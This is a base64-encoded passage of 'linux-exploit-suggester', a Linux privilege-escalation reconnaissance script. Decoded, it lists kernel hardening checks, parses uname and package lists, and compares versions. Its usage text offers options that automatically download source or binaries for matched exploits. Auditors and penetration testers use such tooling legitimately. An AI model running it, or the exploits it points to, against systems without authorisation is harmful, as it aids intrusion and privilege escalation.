cmVlX3BhZ2VzKCkgY2FsbAphdmFpbGFibGU6IENPTkZJR19QQUdFX1BPSVNPTklORz15CmVuYWJsZWQ6IGNtZDogZ3JlcCAncGFnZV9wb2lzb249MScgL3Byb2MvY21kbGluZQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3BhZ2VfcG9pc29uaW5nLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBVc2luZyAncmVmY291bnRfdCcgaW5zdGVhZCBvZiAnYXRvbWljX3QnCmF2YWlsYWJsZTogQ09ORklHX1JFRkNPVU5UX0ZVTEw9eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3JlZmNvdW50X2Z1bGwubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEhhcmRlbmluZyBjb21tb24gc3RyL21lbSBmdW5jdGlvbnMgYWdhaW5zdCBidWZmZXIgb3ZlcmZsb3dzCmF2YWlsYWJsZTogQ09ORklHX0ZPUlRJRllfU09VUkNFPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9mb3J0aWZ5X3NvdXJjZS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogUmVzdHJpY3QgL2Rldi9tZW0gYWNjZXNzCmF2YWlsYWJsZTogQ09ORklHX1NUUklDVF9ERVZNRU09eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3N0cmljdF9kZXZtZW0ubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFJlc3RyaWN0IEkvTyBhY2Nlc3MgdG8gL2Rldi9tZW0KYXZhaWxhYmxlOiBDT05GSUdfSU9fU1RSSUNUX0RFVk1FTT15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvaW9fc3RyaWN0X2Rldm1lbS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKc2VjdGlvbjogSGFyZHdhcmUtYmFzZWQgcHJvdGVjdGlvbiBmZWF0dXJlczoKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFN1cGVydmlzb3IgTW9kZSBFeGVjdXRpb24gUHJvdGVjdGlvbiAoU01FUCkgc3VwcG9ydAphdmFpbGFibGU6IHZlcj49My4wCmVuYWJsZWQ6IGNtZDpncmVwIC1xaSBzbWVwIC9wcm9jL2NwdWluZm8KYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zbWVwLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBTdXBlcnZpc29yIE1vZGUgQWNjZXNzIFByZXZlbnRpb24gKFNNQVApIHN1cHBvcnQKYXZhaWxhYmxlOiB2ZXI+PTMuNwplbmFibGVkOiBjbWQ6Z3JlcCAtcWkgc21hcCAvcHJvYy9jcHVpbmZvCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc21hcC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKc2VjdGlvbjogM3JkIHBhcnR5IGtlcm5lbCBwcm90ZWN0aW9uIG1lY2hhbmlzbXM6CkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBHcnNlY3VyaXR5CmF2YWlsYWJsZTogQ09ORklHX0dSS0VSTlNFQz15CmVuYWJsZWQ6IGNtZDp0ZXN0IC1jIC9kZXYvZ3JzZWMKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFBhWAphdmFpbGFibGU6IENPTkZJR19QQVg9eQplbmFibGVkOiBjbWQ6dGVzdCAteCAvc2Jpbi9wYXhjdGwKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IExpbnV4IEtlcm5lbCBSdW50aW1lIEd1YXJkIChMS1JHKSBrZXJuZWwgbW9kdWxlCmVuYWJsZWQ6IGNtZDp0ZXN0IC1kIC9wcm9jL3N5cy9sa3JnCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvbGtyZy5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKc2VjdGlvbjogQXR0YWNrIFN1cmZhY2U6CkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBVc2VyIG5hbWVzcGFjZXMgZm9yIHVucHJpdmlsZWdlZCBhY2NvdW50cwphdmFpbGFibGU6IENPTkZJR19VU0VSX05TPXkKZW5hYmxlZDogc3lzY3RsOmtlcm5lbC51bnByaXZpbGVnZWRfdXNlcm5zX2Nsb25lPT0xCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvdXNlcl9ucy5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogVW5wcml2aWxlZ2VkIGFjY2VzcyB0byBicGYoKSBzeXN0ZW0gY2FsbAphdmFpbGFibGU6IENPTkZJR19CUEZfU1lTQ0FMTD15CmVuYWJsZWQ6IHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX2JwZl9kaXNhYmxlZCE9MQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2JwZl9zeXNjYWxsLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBTeXNjYWxscyBmaWx0ZXJpbmcKYXZhaWxhYmxlOiBDT05GSUdfU0VDQ09NUD15CmVuYWJsZWQ6IGNtZDpncmVwIC1pdyBTZWNjb21wIC9wcm9jL3NlbGYvc3RhdHVzIHwgYXdrICd7cHJpbnQgXCQyfScKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9icGZfc3lzY2FsbC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogU3VwcG9ydCBmb3IgL2Rldi9tZW0gYWNjZXNzCmF2YWlsYWJsZTogQ09ORklHX0RFVk1FTT15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvZGV2bWVtLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBTdXBwb3J0IGZvciAvZGV2L2ttZW0gYWNjZXNzCmF2YWlsYWJsZTogQ09ORklHX0RFVktNRU09eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2RldmttZW0ubWQKRU9GCikKCgp2ZXJzaW9uKCkgewogICAgZWNobyAibGludXgtZXhwbG9pdC1zdWdnZXN0ZXIgIiRWRVJTSU9OIiwgbXpldCwgaHR0cHM6Ly96LWxhYnMuZXUsIE1hcmNoIDIwMTkiCn0KCnVzYWdlKCkgewogICAgZWNobyAiTEVTIHZlci4gJFZFUlNJT04gKGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9saW51eC1leHBsb2l0LXN1Z2dlc3RlcikgYnkgQF9temV0XyIKICAgIGVjaG8KICAgIGVjaG8gIlVzYWdlOiBsaW51eC1leHBsb2l0LXN1Z2dlc3Rlci5zaCBbT1BUSU9OU10iCiAgICBlY2hvCiAgICBlY2hvICIgLVYgfCAtLXZlcnNpb24gICAgICAgICAgICAgICAtIHByaW50IHZlcnNpb24gb2YgdGhpcyBzY3JpcHQiCiAgICBlY2hvICIgLWggfCAtLWhlbHAgICAgICAgICAgICAgICAgICAtIHByaW50IHRoaXMgaGVscCIKICAgIGVjaG8gIiAtayB8IC0ta2VybmVsIDx2ZXJzaW9uPiAgICAgIC0gcHJvdmlkZSBrZXJuZWwgdmVyc2lvbiIKICAgIGVjaG8gIiAtdSB8IC0tdW5hbWUgPHN0cmluZz4gICAgICAgIC0gcHJvdmlkZSAndW5hbWUgLWEnIHN0cmluZyIKICAgIGVjaG8gIiAtLXNraXAtbW9yZS1jaGVja3MgICAgICAgICAgIC0gZG8gbm90IHBlcmZvcm0gYWRkaXRpb25hbCBjaGVja3MgKGtlcm5lbCBjb25maWcsIHN5c2N0bCkgdG8gZGV0ZXJtaW5lIGlmIGV4cGxvaXQgaXMgYXBwbGljYWJsZSIKICAgIGVjaG8gIiAtLXNraXAtcGtnLXZlcnNpb25zICAgICAgICAgIC0gc2tpcCBjaGVja2luZyBmb3IgZXhhY3QgdXNlcnNwYWNlIHBhY2thZ2UgdmVyc2lvbiAoaGVscHMgdG8gYXZvaWQgZmFsc2UgbmVnYXRpdmVzKSIKICAgIGVjaG8gIiAtcCB8IC0tcGtnbGlzdC1maWxlIDxmaWxlPiAgIC0gcHJvdmlkZSBmaWxlIHdpdGggJ2Rwa2cgLWwnIG9yICdycG0gLXFhJyBjb21tYW5kIG91dHB1dCIKICAgIGVjaG8gIiAtLWN2ZWxpc3QtZmlsZSA8ZmlsZT4gICAgICAgIC0gcHJvdmlkZSBmaWxlIHdpdGggTGludXgga2VybmVsIENWRXMgbGlzdCIKICAgIGVjaG8gIiAtLWNoZWNrc2VjICAgICAgICAgICAgICAgICAgIC0gbGlzdCBzZWN1cml0eSByZWxhdGVkIGZlYXR1cmVzIGZvciB5b3VyIEhXL2tlcm5lbCIKICAgIGVjaG8gIiAtcyB8IC0tZmV0Y2gtc291cmNlcyAgICAgICAgIC0gYXV0b21hdGljYWxseSBkb3dubG9hZHMgc291cmNlIGZvciBtYXRjaGVkIGV4cGxvaXQiCiAgICBlY2hvICIgLWIgfCAtLWZldGNoLWJpbmFyaWVzICAgICAgICAtIGF1dG9tYXRpY2FsbHkgZG93bmxvYWRzIGJpbmFyeSBmb3IgbWF0Y2hlZCBleHBsb2l0IGlmIGF2YWlsYWJsZSIKICAgIGVjaG8gIiAtZiB8IC0tZnVsbCAgICAgICAgICAgICAgICAgIC0gc2hvdyBmdWxsIGluZm8gYWJvdXQgbWF0Y2hlZCBleHBsb2l0IgogICAgZWNobyAiIC1nIHwgLS1zaG9ydCAgICAgICAgICAgICAgICAgLSBzaG93IHNob3J0ZW4gaW5mbyBhYm91dCBtYXRjaGVkIGV4cGxvaXQiCiAgICBlY2hvICIgLS1rZXJuZWxzcGFjZS1vbmx5ICAgICAgICAgICAtIHNob3cgb25seSBrZXJuZWwgdnVsbmVyYWJpbGl0aWVzIgogICAgZWNobyAiIC0tdXNlcnNwYWNlLW9ubHkgICAgICAgICAgICAgLSBzaG93IG9ubHkgdXNlcnNwYWNlIHZ1bG5lcmFiaWxpdGllcyIKICAgIGVjaG8gIiAtZCB8IC0tc2hvdy1kb3MgICAgICAgICAgICAgIC0gc2hvdyBhbHNvIERvU2VzIGluIHJlc3VsdHMiCn0KCmV4aXRXaXRoRXJyTXNnKCkgewogICAgZWNobyAiJDEiIDE+JjIKICAgIGV4aXQgMQp9CgojIGV4dHJhY3RzIGFsbCBpbmZvcm1hdGlvbiBmcm9tIG91dHB1dCBvZiAndW5hbWUgLWEnIGNvbW1hbmQKcGFyc2VVbmFtZSgpIHsKICAgIGxvY2FsIHVuYW1lPSQxCgogICAgS0VSTkVMPSQoZWNobyAiJHVuYW1lIiB8IGF3ayAne3ByaW50ICQzfScgfCBjdXQgLWQgJy0nIC1mIDEpCiAgICBLRVJORUxfQUxMPSQoZWNobyAiJHVuYW1lIiB8IGF3ayAne3ByaW50ICQzfScpCiAgICBBUkNIPSQoZWNobyAiJHVuYW1lIiB8IGF3ayAne3ByaW50ICQoTkYtMSl9JykKCiAgICBPUz0iIgogICAgZWNobyAiJHVuYW1lIiB8IGdyZXAgLXEgLWkgJ2RlYicgJiYgT1M9ImRlYmlhbiIKICAgIGVjaG8gIiR1bmFtZSIgfCBncmVwIC1xIC1pICd1YnVudHUnICYmIE9TPSJ1YnVudHUiCiAgICBlY2hvICIkdW5hbWUiIHwgZ3JlcCAtcSAtaSAnXC1BUkNIJyAmJiBPUz0iYXJjaCIKICAgIGVjaG8gIiR1bmFtZSIgfCBncmVwIC1xIC1pICdcLWRlZXBpbicgJiYgT1M9ImRlZXBpbiIKICAgIGVjaG8gIiR1bmFtZSIgfCBncmVwIC1xIC1pICdcLU1BTkpBUk8nICYmIE9TPSJtYW5qYXJvIgogICAgZWNobyAiJHVuYW1lIiB8IGdyZXAgLXEgLWkgJ1wuZmMnICYmIE9TPSJmZWRvcmEiCiAgICBlY2hvICIkdW5hbWUiIHwgZ3JlcCAtcSAtaSAnXC5lbCcgJiYgT1M9IlJIRUwiCiAgICBlY2hvICIkdW5hbWUiIHwgZ3JlcCAtcSAtaSAnXC5tZ2EnICYmIE9TPSJtYWdlaWEiCgogICAgIyAndW5hbWUgLWEnIG91dHB1dCBkb2Vzbid0IGNvbnRhaW4gZGlzdHJpYnV0aW9uIG51bWJlciAoYXQgbGVhc3Qgbm90IGluIGNhc2Ugb2YgYWxsIGRpc3Ryb3MpCn0KCmdldFBrZ0xpc3QoKSB7CiAgICBsb2NhbCBkaXN0cm89JDEKICAgIGxvY2FsIHBrZ2xpc3RfZmlsZT0kMgogICAgCiAgICAjIHRha2UgcGFja2FnZSBsaXN0aW5nIGZyb20gcHJvdmlkZWQgZmlsZSAmIGRldGVjdCBpZiBpdCdzICdycG0gLXFhJyBsaXN0aW5nIG9yICdkcGtnIC1sJyBvciAncGFjbWFuIC1RJyBsaXN0aW5nIG9mIG5vdCByZWNvZ25pemVkIGxpc3RpbmcKICAgIGlmIFsgIiRvcHRfcGtnbGlzdF9maWxlIiA9ICJ0cnVlIiAtYSAtZSAiJHBrZ2xpc3RfZmlsZSIgXTsgdGhlbgoKICAgICAgICAjIHVidW50dS9kZWJpYW4gcGFja2FnZSBsaXN0aW5nIGZpbGUKICAgICAgICBpZiBbICQoaGVhZCAtMSAiJHBrZ2xpc3RfZmlsZSIgfCBncmVwICdEZXNpcmVkPVVua25vd24vSW5zdGFsbC9SZW1vdmUvUHVyZ2UvSG9sZCcpIF07IHRoZW4KICAgICAgICAgICAgUEtHX0xJU1Q9JChjYXQgIiRwa2dsaXN0X2ZpbGUiIHwgYXdrICd7cHJpbnQgJDIiLSIkM30nIHwgc2VkICdzLzphbWQ2NC8vZycpCgogICAgICAgICAgICBPUz0iZGViaWFuIgogICAgICAgICAgICBbICIkKGdyZXAgdWJ1bnR1ICIkcGtnbGlzdF9maWxlIikiIF0gJiYgT1M9InVidW50dSIKICAgICAgICAjIHJlZGhhdCBwYWNrYWdlIGxpc3RpbmcgZmlsZQogICAgICAgIGVsaWYgWyAiJChncmVwIC1FICdcLmVsWzEtOV0rW1wuX10nICIkcGtnbGlzdF9maWxlIiB8IGhlYWQgLTEpIiBdOyB0aGVuCiAgICAgICAgICAgIFBLR19MSVNUPSQoY2F0ICIkcGtnbGlzdF9maWxlIikKICAgICAgICAgICAgT1M9IlJIRUwiCiAgICAgICAgIyBmZWRvcmEgcGFja2FnZSBsaXN0aW5nIGZpbGUKICAgICAgICBlbGlmIFsgIiQoZ3JlcCAtRSAnXC5mY1sxLTldKydpICIkcGtnbGlzdF9maWxlIiB8IGhlYWQgLTEpIiBdOyB0aGVuCiAgICAgICAgICAgIFBLR19MSVNUPSQoY2F0ICIkcGtnbGlzdF9maWxlIikKICAgICAgICAgICAgT1M9ImZlZG9yYSIKICAgICAgICAjIG1hZ2VpYSBwYWNrYWdlIGxpc3RpbmcgZmlsZQogICAgICAgIGVsaWYgWyAiJChncmVwIC1FICdcLm1nYVsxLTldKycgIiRwa2dsaXN0X2ZpbGUiIHwgaGVhZCAtMSkiIF07IHRoZW4KICAgICAgICAgICAgUEtHX0xJU1Q9JChjYXQgIiRwa2dsaXN0X2ZpbGUiKQogICAgICAgICAgICBPUz0ibWFnZWlhIgogICAgICAgICMgcGFjbWFuIHBhY2thZ2UgbGlzdGluZyBmaWxlCiAgICAgICAgZWxpZiBbICIkKGdyZXAgLUUgJ1wgWzAtOV0rXC4nICIkcGtnbGlzdF9maWxlIiB8IGhlYWQgLTEpIiBdOyB0aGVuCiAgICAgICAgICAgIFBLR19MSVNUPSQoY2F0ICIkcGtnbGlzdF9maWxlIiB8IGF3ayAne3ByaW50ICQxIi0iJDJ9JykKICAgICAgICAgICAgT1M9ImFyY2giCiAgICAgICAgIyBmaWxlIG5vdCByZWNvZ25pemVkIC0gc2tpcHBpbmcKICAgICAgICBlbHNlCiAgICAgICAgICAgIFBLR19MSVNUPSIiCiAgICAgICAgZmkKCiAgICBlbGlmIFsgIiRkaXN0cm8iID0gImRlYmlhbiIgLW8gIiRkaXN0cm8iID0gInVidW50dSIgLW8gIiRkaXN0cm8iID0gImRlZXBpbiIgXTsgdGhlbgogICAgICAgIFBLR19MSVNUPSQoZHBrZyAtbCB8IGF3ayAne3ByaW50ICQyIi0iJDN9JyB8IHNlZCAncy86YW1kNjQvL2cnKQogICAgZWxpZiBbICIkZGlzdHJvIiA9ICJSSEVMIiAtbyAiJGRpc3RybyIgPSAiZmVkb3JhIiAtbyAiJGRpc3RybyIgPSAibWFnZWlhIiBdOyB0aGVuCiAgICAgICAgUEtHX0xJU1Q9JChycG0gLXFhKQogICAgZWxpZiBbICIkZGlzdHJvIiA9ICJhcmNoIiAtbyAiJGRpc3RybyIgPSAibWFuamFybyIgXTsgdGhlbgogICAgICAgIFBLR19MSVNUPSQocGFjbWFuIC1RIHwgYXdrICd7cHJpbnQgJDEiLSIkMn0nKQogICAgZWxpZiBbIC14IC91c3IvYmluL2VxdWVyeSBdOyB0aGVuCiAgICAgICAgUEtHX0xJU1Q9JCgvdXNyL2Jpbi9lcXVlcnkgLS1xdWlldCBsaXN0ICcqJyAtRiAnJG5hbWU6JHZlcnNpb24nIHwgY3V0IC1kLyAtZjItIHwgYXdrICd7cHJpbnQgJDEiOiIkMn0nKQogICAgZWxzZQogICAgICAgICMgcGFja2FnZXMgbGlzdGluZyBub3QgYXZhaWxhYmxlCiAgICAgICAgUEtHX0xJU1Q9IiIKICAgIGZpCn0KCiMgZnJvbTogaHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDAyMzgzMC9ob3ctY29tcGFyZS10d28tc3RyaW5ncy1pbi1kb3Qtc2VwYXJhdGVkLXZlcnNpb24tZm9ybWF0LWluLWJhc2gKdmVyQ29tcGFyaXNpb24oKSB7CgogICAgaWYgW1sgJDEgPT0gJDIgXV0KICAgIHRoZW4KICAgICAgICByZXR1cm4gMAogICAgZmkKCiAgICBsb2NhbCBJRlM9LgogICAgbG9jYWwgaSB2ZXIxPSgkMSkgdmVyMj0oJDIpCgogICAgIyBmaWxsIGVtcHR5IGZpZWxkcyBpbiB2ZXIxIHdpdGggemVyb3MKICAgIGZvciAoKGk9JHsjdmVyMVtAXX07IGk8JHsjdmVyMltAXX07IGkrKykpCiAgICBkbwogICAgICAgIHZlcjFbaV09MAogICAgZG9uZQoKICAgIGZvciAoKGk9MDsgaTwkeyN2ZXIxW0BdfTsgaSsrKSkKICAgIGRvCiAgICAgICAgaWYgW1sgLXogJHt2ZXIyW2ldfSBdXQogICAgICAgIHRoZW4KICAgICAgICAgICAgIyBmaWxsIGVtcHR5IGZpZWxkcyBpbiB2ZXIyIHdpdGggemVyb3MKICAgICAgICAgICAgdmVyMltpXT0wCiAgICAgICAgZmkKICAgICAgICBpZiAoKDEwIyR7dmVyMVtpXX0gPiAxMCMke3ZlcjJbaV19KSkKICAgICAgICB0aGVuCiAgICAgICAgICAgIHJldHVybiAxCiAgICAgICAgZmkKICAgICAgICBpZiAoKDEwIyR7dmVyMVtpXX0gPCAxMCMke3ZlcjJbaV19KSkKICAgICAgICB0aGVuCiAgICAgICAgICAgIHJldHVybiAyCiAgICAgICAgZmkKICAgIGRvbmUKCiAgICByZXR1cm4gMAp9Cgpkb1ZlcnNpb25Db21wYXJpc2lvbigpIHsKICAgIGxvY2FsIHJlcVZlcnNpb249IiQxIgogICAgbG9jYWwgcmVxUmVsYXRpb249IiQyIgogICAgbG9jYWwgY3VycmVudFZlcnNpb249IiQzIgoKICAgIHZlckNvbXBhcmlzaW9uICRjdXJyZW50VmVyc2lvbiAkcmVxVmVyc2lvbgogICAgY2FzZSAkPyBpbgogICAgICAgIDApIGN1cnJlbnRSZWxhdGlvbj0nPSc7OwogICAgICAgIDEpIGN1cnJlbnRSZWxhdGlvbj0nPic7OwogICAgICAgIDIpIGN1cnJlbnRSZWxhdGlvbj0nPCc7OwogICAgZXNhYwoKICAgIGlmIFsgIiRyZXFSZWxhdGlvbiIgPT0gIj0iIF07IHRoZW4KICAgICAgICBbICRjdXJyZW50UmVsYXRpb24gPT0gIj0iIF0gJiYgcmV0dXJuIDAKICAgIGVsaWYgWyAiJHJlcVJlbGF0aW9uIiA9PSAiPiIgXTsgdGhlbgogICAgICAgIFsgJGN1cnJlbnRSZWxhdGlvbiA9PSAiPiIgXSAmJiByZXR1cm4gMAogICAgZWxpZiBbICIkcmVxUmVsYXRpb24iID09ICI8IiBdOyB0aGVuCiAgICAgICAgWyAkY3VycmVudFJlbGF0aW9uID09ICI8IiBdICYmIHJldHVybiAwCiAgICBlbGlmIFsgIiRyZXFSZWxhdGlvbiIgPT0gIj49IiBdOyB0aGVuCiAgICAgICAgWyAkY3VycmVudFJlbGF0aW9uID09ICI9IiBdICYmIHJldHVybiAwCiAgICAgICAgWyAkY3VycmVudFJlbGF0aW9uID09ICI+IiBdICYmIHJldHVybiAwCiAgICBlbGlmIFsgIiRyZXFSZWxhdGlvbiIgPT0gIjw9IiBdOyB0aGVuCiAgICAgICAgWyAkY3VycmVudFJlbGF0aW9uID09ICI9IiBdICYmIHJldHVybiAwCiAgICAgICAgWyAkY3VycmVudFJlbGF0aW9uID09ICI8IiBdICYmIHJldHVybiAwCiAgICBmaQp9Cgpjb21wYXJlVmFsdWVzKCkgewogICAgY3VyVmFsPSQxCiAgICB2YWw9JDIKICAgIHNpZ249JDMKCiAgICBpZiBbICIkc2lnbiIgPT0gIj09IiBdOyB0aGVuCiAgICAgICAgWyAiJHZhbCIgPT0gIiRjdXJWYWwiIF0gJiYgcmV0dXJuIDAKICAgIGVsaWYgWyAiJHNpZ24iID09ICIhPSIgXTsgdGhlbgogICAgICAgIFsgIiR2YWwiICE9ICIkY3VyVmFsIiBdICYmIHJldHVybiAwCiAgICBmaQoKICAgIHJldHVybiAxCn0KCmNoZWNrUmVxdWlyZW1lbnQoKSB7CiAgICAjZWNobyAiQ2hlY2tpbmcgcmVxdWlyZW1lbnQ6ICQxIgogICAgbG9jYWwgSU49IiQxIgogICAgbG9jYWwgcGtnTmFtZT0iJHsyOjR9IgoKICAgIGlmIFtbICIkSU4iID1+IF5wa2c9LiokIF1dOyB0aGVuCgogICAgICAgICMgYWx3YXlzIHRydWUgZm9yIExpbnV4IE9TCiAgICAgICAgWyAke3BrZ05hbWV9ID09ICJsaW51eC1rZXJuZWwiIF0gJiYgcmV0dXJuIDAKCiAgICAgICAgIyB2ZXJpZnkgaWYgcGFja2FnZSBpcyBwcmVzZW50IAogICAgICAgIHBrZz0kKGVjaG8gIiRQS0dfTElTVCIgfCBncmVwIC1FIC1pICJeJHBrZ05hbWUtWzAtOV0rIiB8IGhlYWQgLTEpCiAgICAgICAgaWYgWyAtbiAiJHBrZyIgXTsgdGhlbgogICAgICAgICAgICByZXR1cm4gMAogICAgICAgIGZpCgogICAgZWxpZiBbWyAiJElOIiA9fiBedmVyLiokIF1dOyB0aGVuCiAgICAgICAgdmVyc2lvbj0iJHtJTi8vW14wLTkuXS99IgogICAgICAgIHJlc3Q9IiR7SU4jdmVyfSIKICAgICAgICBvcGVyYXRvcj0ke3Jlc3QlJHZlcnNpb259CgogICAgICAgIGlmIFsgIiRwa2dOYW1lIiA9PSAibGludXgta2VybmVsIiAtbyAiJG9wdF9jaGVja3NlY19tb2RlIiA9PSAidHJ1ZSIgXTsgdGhlbgoKICAgICAgICAgICAgIyBmb3IgLS1jdmVsaXN0LWZpbGUgbW9kZSBza2lwIGtlcm5lbCB2ZXJzaW9uIGNvbXBhcmlzaW9uCiAgICAgICAgICAgIFsgIiRvcHRfY3ZlbGlzdF9maWxlIiA9ICJ0cnVlIiBdICYmIHJldHVybiAwCgogICAgICAgICAgICBkb1ZlcnNpb25Db21wYXJpc2lvbiAkdmVyc2lvbiAkb3BlcmF0b3IgJEtFUk5FTCAmJiByZXR1cm4gMAogICAgICAgIGVsc2UKICAgICAgICAgICAgIyBleHRyYWN0IHBhY2thZ2UgdmVyc2lvbiBhbmQgY2hlY2sgaWYgcmVxdWlyZW1udCBpcyB0cnVlCiAgICAgICAgICAgIHBrZz0kKGVjaG8gIiRQS0dfTElTVCIgfCBncmVwIC1FIC1pICJeJHBrZ05hbWUtWzAtOV0rIiB8IGhlYWQgLTEpCgogICAgICAgICAgICAjIHNraXAgKGlmIHJ1biB3aXRoIC0tc2tpcC1wa2ctdmVyc2lvbnMpIHZlcnNpb24gY2hlY2tpbmcgaWYgcGFja2FnZSB3aXRoIGdpdmVuIG5hbWUgaXMgaW5zdGFsbGVkCiAgICAgICAgICAgIFsgIiRvcHRfc2tpcF9wa2dfdmVyc2lvbnMiID0gInRydWUiIC1hIC1uICIkcGtnIiBdICYmIHJldHVybiAwCgogICAgICAgICAgICAjIHZlcnNpb25pbmc6CiAgICAgICAgICAgICNlY2hvICJwa2c6ICRwa2ciCiAgICAgICAgICAgIHBrZ1ZlcnNpb249JChlY2hvICIkcGtnIiB8IGdyZXAgLUUgLWkgLW8gLWUgJy1bXC4wLTlcKzpwXStbLVwrXScgfCBjdXQgLWQnOicgLWYyIHwgc2VkICdzL1tcKy1dLy9nJyB8IHNlZCAncy9wWzAtOV0vL2cnKQogICAgICAgICAgICAjZWNobyAidmVyc2lvbjogJHBrZ1ZlcnNpb24iCiAgICAgICAgICAgICNlY2hvICJvcGVyYXRvcjogJG9wZXJhdG9yIgogICAgICAgICAgICAjZWNobyAicmVxdWlyZWQgdmVyc2lvbjogJHZlcnNpb24iCiAgICAgICAgICAgICNlY2hvCiAgICAgICAgICAgIGRvVmVyc2lvbkNvbXBhcmlzaW9uICR2ZXJzaW9uICRvcGVyYXRvciAkcGtnVmVyc2lvbiAmJiByZXR1cm4gMAogICAgICAgIGZpCiAgICBlbGlmIFtbICIkSU4iID1+IF54ODZfNjQkIF1dICYmIFsgIiRBUkNIIiA9PSAieDg2XzY0IiAtbyAiJEFSQ0giID09ICIiIF07IHRoZW4KICAgICAgICByZXR1cm4gMAogICAgZWxpZiBbWyAiJElOIiA9fiBeeDg2JCBdXSAmJiBbICIkQVJDSCIgPT0gImkzODYiIC1vICIkQVJDSCIgPT0gImk2ODYiIC1vICIkQVJDSCIgPT0gIiIgXTsgdGhlbgogICAgICAgIHJldHVybiAwCiAgICBlbGlmIFtbICIkSU4iID1+IF5DT05GSUdfLiokIF1dOyB0aGVuCgogICAgICAgICMgc2tpcCBpZiBjaGVjayBpcyBub3QgYXBwbGljYWJsZSAoLWsgb3IgLS11bmFtZSBvciAtcCBzZXQpIG9yIGlmIHVzZXIgc2FpZCBzbyAoLS1za2lwLW1vcmUtY2hlY2tzKQogICAgICAgIFsgIiRvcHRfc2tpcF9tb3JlX2NoZWNrcyIgPSAidHJ1ZSIgXSAmJiByZXR1cm4gMAoKICAgICAgICAjIGlmIGtlcm5lbCBjb25maWcgSVMgYXZhaWxhYmxlOgogICAgICAgIGlmIFsgLW4gIiRLQ09ORklHIiBdOyB0aGVuCiAgICAgICAgICAgIGlmICRLQ09ORklHIHwgZ3JlcCAtRSAtcWkgJElOOyB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gMDsKICAgICAgICAgICAgIyByZXF1aXJlZCBvcHRpb24gd2Fzbid0IGZvdW5kLCBleHBsb2l0IGlzIG5vdCBhcHBsaWNhYmxlCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHJldHVybiAxOwogICAgICAgICAgICBmaQogICAgICAgICMgY29uZmlnIGlzIG5vdCBhdmFpbGFibGUKICAgICAgICBlbHNlCiAgICAgICAgICAgIHJldHVybiAwOwogICAgICAgIGZpCiAgICBlbGlmIFtbICIkSU4iID1+IF5zeXNjdGw6LiokIF1dOyB0aGVuCgogICAgICAgIC